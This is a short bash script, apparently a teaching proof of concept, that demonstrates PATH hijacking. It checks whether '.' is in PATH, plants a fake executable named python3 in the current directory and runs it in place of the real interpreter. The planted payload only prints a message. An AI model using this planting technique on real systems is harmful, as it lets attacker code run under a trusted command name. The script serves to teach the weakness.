#!/usr/bin/bash

set -e

echo "[*] Preparing PATH hijack (Binary Planting)"

# Check if '.' exists in PATH
if [[ ":$PATH:" != *":.:"* ]]; then
    echo "[!] No vulnerability detected: '.' not found in PATH"
    echo "[*] Attack aborted."
    exit 1
fi

echo "[*] Vulnerability confirmed: '.' is present in PATH"

echo "[*] Original python3 location:"
which python3

# Create malicious binary
echo -e '#!/bin/bash\necho "🔥 PYTHON EXECUTION HIJACKED"' > ./python3
chmod +x ./python3

echo "[*] Now run 'python3' manually to observe the hijack"

(export PATH=.:$PATH
python3
)
